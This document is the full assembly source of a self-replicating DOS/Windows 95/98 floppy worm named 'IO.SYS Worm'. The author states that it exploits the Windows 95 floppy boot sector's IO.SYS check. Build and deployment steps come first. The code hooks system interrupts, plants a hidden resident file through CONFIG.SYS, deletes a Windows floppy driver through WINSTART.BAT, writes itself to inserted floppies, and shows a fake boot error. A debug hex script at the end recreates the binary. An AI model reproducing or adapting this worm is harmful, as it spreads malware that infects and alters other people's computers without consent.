comment ~

The "IO.SYS Worm" is just to show another hole in the Microsoft Opperating
System.  Windows 95 introduced a real nice boot sector for it's floppy disks.
This boot sector would look for IO.SYS anywhere on drive A:  Once it found it,
it would check for "MZ" at the beginning and "BJ" at offset 200h.  All that
was needed was a way to exploit this.  "IO.SYS Worm" was born.  "IO.SYS Worm"
has those 2 signatures and it's own worm code.  The worm creates the file:
C:\WINSTART.BAT that automatically deletes HSFLOP.PDR from the IOSUBSYS
directory when Windows 95/98 starts.  It also adds to the C:\CONFIG.SYS:
INSTALL=C:\JFHKPMQL.BKF (name is random)  This is the Memory Resident Worm
code.  With HSFLOP.PDR gone, it can hook INT 40 and detect floppy access.  It
hooks INT 21 and writes to A:\IO.SYS whenever A:\ is accessed.  The infection
is complete. 


By "Q" the Misanthrope


tasm IO /m2
tlink IO /t
format a:/q/u
copy IO.COM A:\IO.SYS
leave floppy in drive a:
reboot

Note:  Replication to A:\IO.SYS will not occure until the second loading of
Windows 95/98 because HSFLOP.PDR is still active on the first loading.


~

page


qseg            segment para    public  'code'
iosysworm       proc    far
assume          cs:qseg

.286

	        org     0100h              
com_code:


exe_signature   dw      5a4dh                   ;EXE header
last_bytes_mod: dw      0000h
pages_512       dw      0002h
relocations     dw      0000h
headersize      dw      0002h
minmorememory   dw      0001h
maxmorememory:  dw      0ffffh
initial_ss      dw      0000h
initial_sp      dw      0fffeh
checksum        dw      0000h
cs_ip           dd      00000000h
ptr_relocation  dw      relocationtable-0100h
overlaynumber   dw      0000h
relocationtable dw      0000h
                db      00h
trigger         equ     002eh


                org     0120h


far_jmp_int21   equ     $-25h
previous_int21  equ     000ch
previous_serial equ     0002h


begin_res_code  proc    near                    ;executed as an EXE file
                push    cs                      ;so this offset is actually
                pop     ds                      ;0000h and not 0120h
                mov     ax,cs
                sub     ax,03h                  ;the EXE header was lost
                mov     es,ax                   ;so there needed to be a copy
                push    es                      ;saved for the infection
                xor     di,di
                mov     si,offset exe_header_copy-0120h-0010h
                mov     cx,30h                  ;copy EXE header
                cld
                rep     movs byte ptr es:[di],ds:[si]
                mov     ax,3540h                ;hook int 40
                int     21h
                mov     word ptr ds:[previous_hook-0120h],bx
                mov     word ptr ds:[previous_hook+02h-0120h],es
                mov     ax,3521h                ;hook int 21
                int     21h
                pop     ds
                mov     word ptr ds:[previous_int21],bx
                mov     word ptr ds:[previous_int21+02h],es
                mov     ah,51h                  ;get psp
                int     21h
                push    bx
                pop     es
                mov     word ptr es,es:[002ch]  ;get environment
                mov     ah,49h                  ;free it
                int     21h
                mov     dx,offset interrupt_40res-0120h+0030h
                mov     ax,2540h                ;set int 40
                int     21h
                mov     dx,offset interrupt_21res-0120h+0030h
                mov     ax,2521h                ;set int 21
                int     21h
                mov     ax,3100h                ;go resident
                mov     dx,50h
                int     21h
begin_res_code  endp


interrupt_40res proc    near                    ;check for the reading of
                pushf                           ;boot sector information
                cmp     ah,02h
                jne     not_read
                or      dx,dx
                jnz     not_read
                cmp     cx,00001h
                jne     not_read                ;if so then tell int 21 to
                mov     byte ptr cs:[trigger],01h
not_read:       popf                            ;infect on next call
                jmp     far_jmp
interrupt_40res endp


interrupt_21res proc    near                    ;check for infect from int 40
                pushf
                push    es
                push    ds
                pusha
                push    cs
                pop     ds
                cmp     byte ptr ds:[trigger],00h
                je      not_yet
                mov     ax,3524h                ;get critical error handler
                pushf
                push    cs
                call    far_jmp_int21
                mov     ax,2524h                ;set our own
                push    ax
                push    bx
                push    es
                call    set_int24
                mov     al,03h
                iret
set_int24:      pop     dx
                pushf
                push    cs
                call    far_jmp_int21
                mov     ah,5bh                  ;create new file a:\io.sys
                call    get_wormfile
                db      'A:\IO.SYS',00h
get_wormfile:   pop     dx
                mov     cx,0007h                ;read only system and hidden
                pushf
                push    cs
                call    far_jmp_int21
                mov     byte ptr cs:[trigger],00h
                jc      set_int24_back
                xchg    ax,bx
                mov     ah,40h
                mov     dx,0010h
                mov     cx,0400h                ;write 1024 bytes
                pushf
                push    cs
                call    far_jmp_int21
                mov     ah,3eh                  ;close it
                pushf
                push    cs
                call    far_jmp_int21
set_int24_back: pop     ds
                pop     dx
                pop     ax
                pushf
                push    cs
                call    far_jmp_int21           ;set critical error back
not_yet:        popa
                pop     ds
                pop     es
                popf
                jmp     far_jmp_int21
interrupt_21res endp


return_far:     retf


duh             db      'IO.SYS Worm by "Q" the Misanthrope',0dh,0ah


install_name    db      'INSTALL='
file_name       db      'C:\'
device_name     db      'IO.SYS W'              ;pseudo virus name goes here
file_dot        db      'orm '                  ;with random extension
asciz_nul       db      00h
crlf            equ     $-01h
invalid_system  db      0dh,0ah,'Invalid system disk.',0dh,0ah
                db      'Replace the disk, and then press any key',0dh,0ah,00h


                org     0300h                   ;we are at 0070:0200 now


jmp_install     proc    near
signature1:     inc     dx
                dec     dx
                push    8000h                   ;if monochrome go here
                pop     es
                push    00h
                pop     ds
                xor     si,si
	        cld     
                cmp     byte ptr ds:[0449h],07h ;check monchrome
	        je      monochrome
                push    0bc00h                  ;lets reside in video memory
                pop     es                      ;no need for that TOM
                cmp     word ptr es:[si],'ZM'
monochrome:     push    es                      ;check if already mem resident
                mov     di,si                   ;di=7c00
                mov     cx,offset previous_hook-0100h
                push    cx                      ;save it because we will copy
                push    si                      ;the code twice to b700:7c00
                rep     movs byte ptr es:[di],cs:[si]
	        pop     si
	        pop     cx
                call    return_far              ;goto b700 segment of code
                lea     di,word ptr ds:[di+04h] ;add 4 without changing flags
                rep     movs byte ptr es:[di],cs:[si]
                mov     si,1ah*04h              ;only hook int 1a
                je      already_res             ;if already resident don't
                movsw                           ;hook again
	        movsw
 mov     word ptr ds:[si-04h],interrupt_1a-com_code+previous_hook-com_code+0004h
                mov     word ptr ds:[si-02h],cs
already_res:    mov     si,offset invalid_system-0100h
                push    cs
                pop     ds
show_message:   mov     ah,0eh                  ;pretend boot sector message
                lodsb
                or      al,al
                jz      key_press
                int     10h
                jmp     short show_message
key_press:      xor     ax,ax
                int     16h
                int     19h
jmp_install     endp


config_line     db      'C:\CONFIG.SYS'
info            dw      0000h
serialnumber    dd      00000000h               ;drive C: serial number
                db      19 dup(00h)             ;misc junk
winstart_text   db      '@CTTY NUL',0dh,0ah
                db      'DEL %WINBOOTDIR%\SYSTEM\IOSUBSYS\HSFLOP.PDR',0dh,0ah
                db      '@CTTY CON',0dh,0ah
                db      '@DEL '
winstart        db      'C:\WINSTART.BAT'
winstart_nul    db      1ah
winstart_end    label   byte


retry_later:    jmp     pop_it     


interrupt_21    proc    near                    ;hooked in after int 1a sees
                pushf                           ;that dos loaded during boot
         	pusha   
	        push    ds
                push    es
	        push    cs
	        pop     ds
                xor     ah,4bh                  ;unload if a program starts
                jnz     open_config
                jmp     set_21_back
open_config:    mov     ax,3d42h                ;open c:\config.sys
                mov     dx,config_line-com_code+previous_hook-com_code+0004h
                int     18h                     ;really it is int 21
                mov     bx,5700h                ;get date
                xchg    ax,bx
                jc      retry_later             ;unable to open c:\config.sys
                int     18h                     
                or      cl,cl                   ;is c:\config.sys infected
                jz      close_it
                pusha                           ;save file date
                mov     ax,6900h                ;get drive serial number
                mov     bx,0003h                ;drive C:
                push    cs
                pop     ds
                mov     dx,info-com_code+previous_hook-com_code+0004h
                int     18h
                cld
                mov     si,serialnumber-com_code+previous_hook-com_code+0004h
                mov     di,device_name-com_code+previous_hook-com_code+0004h
                mov     cx,0004h                ;loop 4 times
get_serial:     lodsb                           ;get start of serial number
                push    cx
                mov     cl,03h                  ;inner loop 2 times
make_file:      ror     al,03h
                mov     bl,al
                and     bl,0fh
                add     bl,'A'                  ;create letter from A to P
                mov     byte ptr ds:[di],bl
                inc     di                      ;save it and move pointer
                loop    make_file
                pop     cx
                loop    get_serial
                mov     byte ptr ds:[di-04h],'.'
                mov     ah,5bh                  ;create random file
                mov     cl,07h                  ;read only hidden and system
                mov     dx,file_name-com_code+previous_hook-com_code+0004h
                int     18h
                jc      worm_was_there
                mov     dx,offset com_code-0100h
                mov     bh,40h                  ;write virus code into file
                xchg    ax,bx
                mov     cx,0400h
                int     18h
                mov     ah,3eh                  ;close it
                int     18h
                popa                            ;date and handle c:\config.sys
                inc     ax                      ;set date
                pusha                           ;save it for later
                mov     ax,4202h                ;go to end of c:\config.sys
	        cwd
                push    dx
                pop     cx
                int     18h
                mov     ah,40h                  ;write INSTALL=\ line
          mov     word ptr ds:[crlf-com_code+previous_hook-com_code+0004h],0a0dh
                mov     cl,low(crlf-install_name+02h)
                mov     dx,install_name-com_code+previous_hook-com_code+0004h
                int     18h                     ;be sure to cr lf terminate it
worm_was_there: popa                            ;get file date
                shr     cl,cl                   ;blitz seconds and more 
                int     18h
close_it:       mov     ah,3eh                  ;close c:\config.sys
                int     18h
                mov     ah,3ch                  ;create file
                xor     cx,cx
     mov     word ptr ds:[winstart_nul-com_code+previous_hook-com_code+0004h],cx
                mov     dx,winstart-com_code+previous_hook-com_code+0004h
                int     18h
                mov     dx,offset winstart_text-0100h
                mov     bh,40h                  ;write winstart code into file
                xchg    ax,bx
                mov     cl,low(winstart_end-winstart_text)
                int     18h
                mov     ah,3eh                  ;close it
                int     18h
set_21_back:    lds     dx,dword ptr ds:[previous_hook-0100h]
                jmp     short set_int_21
interrupt_21    endp


                org     049fh


interrupt_1a    proc    near                    ;hooked at boot and waits for
                pushf                           ;dos to load
	        pusha
                mov     ax,1200h                ;dos loaded
	        push    ds
	        push    es
	        cwd
                int     2fh
                inc     al
                jnz     pop_it
                mov     ds,dx
                mov     si,21h*04h
                mov     di,offset previous_hook-0100h
   les     bx,dword ptr cs:[previous_hook-com_code+previous_hook-com_code+0004h]
                mov     ds:[si-((21h-1ah)*04h)+02h],es
                mov     ds:[si-((21h-1ah)*04h)],bx
	        les     bx,dword ptr ds:[si]
                mov     ds:[si-((21h-18h)*04h)+02h],es
                push    cs
	        cld     
                mov     ds:[si-((21h-18h)*04h)],bx
	        pop     es
	        movsw
	        movsw
                mov     dx,offset interrupt_21-0100h
                push    cs
                pop     ds
set_int_21:     mov     ax,2521h
                int     18h
pop_it:         pop     es
                pop     ds
		popa    
		popf
interrupt_1a    endp


far_jmp         proc    near
                db      0eah                    ;jmp to old int 1a or boot
previous_hook:  label   double                  ;up int 21 or resident int 21
far_jmp         endp


                org     04e0h


exe_header_copy dw      5a4dh                   ;copy of EXE header
                dw      0000h
                dw      0002h
                dw      0000h
                dw      0002h
                dw      0001h
                dw      0ffffh
                dw      0000h
                dw      0fffeh
                dw      0000h
                dd      00000000h
                dw      relocationtable-0100h
                dw      0000h
                dw      0000h
                dw      0000h


iosysworm       endp
qseg            ends
end             com_code


comment ~


debug script:
nA:\IO.SYS
e0100  4D 5A 00 00 02 00 00 00 02 00 01 00 FF FF 00 00
e0110  FE FF 00 00 00 00 00 00 1C 00 00 00 00 00 00 00
e0120  0E 1F 8C C8 2D 03 00 8E C0 06 33 FF BE B0 03 B9
e0130  30 00 FC F3 A4 B8 40 35 CD 21 89 1E BC 03 8C 06
e0140  BE 03 B8 21 35 CD 21 1F 89 1E 0C 00 8C 06 0E 00
e0150  B4 51 CD 21 53 07 26 8E 06 2C 00 B4 49 CD 21 BA
e0160  87 00 B8 40 25 CD 21 BA A0 00 B8 21 25 CD 21 B8
e0170  00 31 BA 50 00 CD 21 9C 80 FC 02 75 0F 0B D2 75
e0180  0B 83 F9 01 75 06 2E C6 06 2E 00 01 9D E9 4B 03
e0190  9C 06 1E 60 0E 1F 80 3E 2E 00 00 74 57 B8 24 35
e01A0  9C 0E E8 56 FF B8 24 25 50 53 06 E8 03 00 B0 03
e01B0  CF 5A 9C 0E E8 44 FF B4 5B E8 0A 00 41 3A 5C 49
e01C0  4F 2E 53 59 53 00 5A B9 07 00 9C 0E E8 2C FF 2E
e01D0  C6 06 2E 00 00 72 15 93 B4 40 BA 10 00 B9 00 04
e01E0  9C 0E E8 16 FF B4 3E 9C 0E E8 0F FF 1F 5A 58 9C
e01F0  0E E8 07 FF 61 1F 07 9D E9 00 FF CB 49 4F 2E 53
e0200  59 53 20 57 6F 72 6D 20 62 79 20 22 51 22 20 74
e0210  68 65 20 4D 69 73 61 6E 74 68 72 6F 70 65 0D 0A
e0220  49 4E 53 54 41 4C 4C 3D 43 3A 5C 49 4F 2E 53 59
e0230  53 20 57 6F 72 6D 20 00 0D 0A 49 6E 76 61 6C 69
e0240  64 20 73 79 73 74 65 6D 20 64 69 73 6B 2E 0D 0A
e0250  52 65 70 6C 61 63 65 20 74 68 65 20 64 69 73 6B
e0260  2C 20 61 6E 64 20 74 68 65 6E 20 70 72 65 73 73
e0270  20 61 6E 79 20 6B 65 79 0D 0A 00 00 00 00 00 00
e0280  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
e0290  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
e02A0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
e02B0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
e02C0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
e02D0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
e02E0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
e02F0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
e0300  42 4A 68 00 80 07 6A 00 1F 33 F6 FC 80 3E 49 04
e0310  07 74 09 68 00 BC 07 26 81 3C 4D 5A 06 8B FE B9
e0320  DC 03 51 56 F3 2E A4 5E 59 E8 CF FE 8D 7D 04 F3
e0330  2E A4 BE 68 00 74 0A A5 A5 C7 44 FC 7F 07 8C 4C
e0340  FE BE 38 01 0E 1F B4 0E AC 0A C0 74 04 CD 10 EB
e0350  F5 33 C0 CD 16 CD 19 43 3A 5C 43 4F 4E 46 49 47
e0360  2E 53 59 53 00 00 00 00 00 00 00 00 00 00 00 00
e0370  00 00 00 00 00 00 00 00 00 00 00 00 00 40 43 54
e0380  54 59 20 4E 55 4C 0D 0A 44 45 4C 20 25 57 49 4E
e0390  42 4F 4F 54 44 49 52 25 5C 53 59 53 54 45 4D 5C
e03A0  49 4F 53 55 42 53 59 53 5C 48 53 46 4C 4F 50 2E
e03B0  50 44 52 0D 0A 40 43 54 54 59 20 43 4F 4E 0D 0A
e03C0  40 44 45 4C 20 43 3A 5C 57 49 4E 53 54 41 52 54
e03D0  2E 42 41 54 1A E9 FF 00 9C 60 1E 06 0E 1F 80 F4
e03E0  4B 75 03 E9 9F 00 B8 42 3D BA 37 06 CD 18 BB 00
e03F0  57 93 72 E1 CD 18 0A C9 74 6C 60 B8 00 69 BB 03
e0400  00 0E 1F BA 44 06 CD 18 FC BE 46 06 BF 0B 05 B9
e0410  04 00 AC 51 B1 03 C0 C8 03 8A D8 80 E3 0F 80 C3
e0420  41 88 1D 47 E2 F0 59 E2 E9 C6 45 FC 2E B4 5B B1
e0430  07 BA 08 05 CD 18 72 29 BA 00 00 B7 40 93 B9 00
e0440  04 CD 18 B4 3E CD 18 61 40 60 B8 02 42 99 52 59
e0450  CD 18 B4 40 C7 06 17 05 0D 0A B1 19 BA 00 05 CD
e0460  18 61 D2 E9 CD 18 B4 3E CD 18 B4 3C 33 C9 89 0E
e0470  B4 06 BA A5 06 CD 18 BA 7D 02 B7 40 93 B1 58 CD
e0480  18 B4 3E CD 18 C5 16 DC 03 EB 47 00 00 00 00 00
e0490  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 9C
e04A0  60 B8 00 12 1E 06 99 CD 2F FE C0 75 2A 8E DA BE
e04B0  84 00 BF DC 03 2E C4 1E BC 07 8C 44 E6 89 5C E4
e04C0  C4 1C 8C 44 DE 0E FC 89 5C DC 07 A5 A5 BA D8 02
e04D0  0E 1F B8 21 25 CD 18 07 1F 61 9D EA 00 00 00 00
e04E0  4D 5A 00 00 02 00 00 00 02 00 01 00 FF FF 00 00
e04F0  FE FF 00 00 00 00 00 00 1C 00 00 00 00 00 00 00
rcx
400
w
q


~

